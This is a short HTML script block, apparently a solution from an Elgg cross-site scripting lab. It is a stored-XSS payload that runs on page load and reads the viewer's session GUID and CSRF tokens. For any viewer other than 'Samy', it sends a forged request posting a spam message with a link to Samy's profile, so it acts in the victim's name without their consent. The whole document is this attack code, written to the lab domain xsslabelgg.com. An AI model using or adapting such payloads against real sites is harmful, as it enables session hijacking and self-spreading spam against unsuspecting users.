

<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var guid = elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var owner = elgg.session.user.name ;
	var samyProfile="http://www.xsslabelgg.com/profile/samy";
	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content="__elgg_token="+token+"&__elgg_ts="+ts+"&";
    content=content+"body=To+earn+12+USD/Hour(!),+visit+now"+" "+samyProfile;
   
	if(owner != 'Samy')
	 {
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);

	 }
 }
</script>
